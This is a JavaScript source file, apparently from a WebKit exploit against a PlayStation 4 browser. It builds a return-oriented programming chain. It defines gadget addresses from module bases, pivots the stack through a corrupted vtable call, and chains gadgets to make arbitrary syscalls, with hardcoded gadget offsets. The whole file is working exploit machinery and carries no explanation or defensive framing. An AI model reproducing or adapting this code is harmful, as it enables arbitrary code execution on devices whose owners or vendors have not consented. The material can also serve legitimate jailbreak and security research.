VTABLE = 0x0
LIBWEBKIT = 0x1
function gadget(module,offset)
{
  this.addr = function()
  {
      return this.get_module_base().add(offset);
  }

  this.get_module_base = function()
  {
    if(module == VTABLE)
      return sce_vtable_address;
    if(module == LIBWEBKIT)
      return sce_webkit_address;
    else return 0;
  }
}

function RopChain()
{
  this.rop_chain = [];
  // Code to cleanup the modification done by by the stack pivot
  // and to store the original stack pointer
  // The value is stored in the first element of the rop_buf array
  // So do not put anything else there.
  this.add('pop rcx')
  this.add(1)
  this.add('add dword ptr [rax - 0x77], ecx')
  this.add('pop rdi')
  var addr = new dcodeIO.Long(cbuf[0x14],cbuf[0x15],true);
  this.add(addr);
  this.add('mov qword ptr [rdi], rax')
}

RopChain.prototype.add = function(instr)
{
  if(typeof(instr) === "string")
  {
    this.rop_chain.push(gadgets[instr].addr().getLowBitsUnsigned())
    this.rop_chain.push(gadgets[instr].addr().getHighBitsUnsigned())
  }
  // If we are only writing a 32bit integer, makes it easier
  else if(typeof(instr) === "number")
  {
    this.rop_chain.push(instr)
    this.rop_chain.push(0)
  }
  else
  {
    this.rop_chain.push(instr.getLowBitsUnsigned())
    this.rop_chain.push(instr.getHighBitsUnsigned())
  }
}

RopChain.prototype.syscall = function(num, arg1, arg2, arg3, arg4, arg5, arg6)
{
  this.add("pop rax");
  this.add(num)
  this.add("pop rdi");
  this.add(typeof(arg1) !== "undefined" ? arg1 : 0)
  this.add("pop rsi");
  this.add(typeof(arg2) !== "undefined" ? arg2 : 0)
  this.add("pop rdx");
  this.add(typeof(arg3) !== "undefined" ? arg3 : 0)
  this.add("pop rcx");
  this.add(typeof(arg4) !== "undefined" ? arg4 : 0)
  this.add("pop r8");
  this.add(typeof(arg5) !== "undefined" ? arg5 : 0)
  this.add("pop r9");
  this.add(typeof(arg6) !== "undefined" ? arg6 : 0)
  this.add("syscall")
}


RopChain.prototype.execute = function()
{
  // xchg rax, rsp; dec dword ptr [rax - 0x77]; ret;
  rop_buf[2] = cbuf[0x10] - ((0x60000 * 4) * 17) + 0xdcac1
  rop_buf[3] = cbuf[0x11]

  // pop rcx; pop rcx; ret;
  rop_buf[0] = cbuf[0x10] - ((0x60000 * 4) * 4) + 0x168f4;
  rop_buf[1] = cbuf[0x11]

  // Code to restore the stack pointer
  this.add('pop rax')
  var addr = new dcodeIO.Long(cbuf[0x14],cbuf[0x15],true);
  this.add(addr)
  this.add('mov rax, qword ptr [rax]')
  this.add('pop rdi')
  addr = new dcodeIO.Long(cbuf[0x14],cbuf[0x15],true).add(4 *(this.rop_chain.length + 0x6 + 0x6));
  this.add(addr)
  this.add('mov qword ptr [rdi], rax')
  this.add('pop rsp')

  // Actually write the chain to the buffer
  for(var i = 0; i < this.rop_chain.length; i++)
  {
    rop_buf[0x6 + i] = this.rop_chain[i]
  }

  // Make the vtable call
  old_low = cbuf[0x10]
  old_high = cbuf[0x11]
  cbuf[0x10] = cbuf[0x14]
  cbuf[0x11] = cbuf[0x15]
  rop_buf.byteLength;
  cbuf[0x10] = old_low
  cbuf[0x11] = old_high

}
